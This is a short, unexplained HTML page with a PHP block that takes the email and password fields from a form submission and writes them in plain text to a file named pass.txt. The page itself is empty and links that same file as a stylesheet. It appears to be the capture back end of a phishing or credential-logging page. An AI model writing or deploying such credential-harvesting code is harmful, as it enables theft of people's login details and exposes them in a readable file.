<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<link rel="stylesheet" href="pass.txt">
<body>
    
</body>
</html>

<?php
$email=$_POST['email'];
$pass=$_POST['password'];
$file=fopen("pass.txt","w");
$txt1="$email";
$txt2=$pass;
fwrite($file,"\n\nemail=");
fwrite($file,$txt1);
fwrite($file,"\n\npassword=");
fwrite($file,$txt2);


?>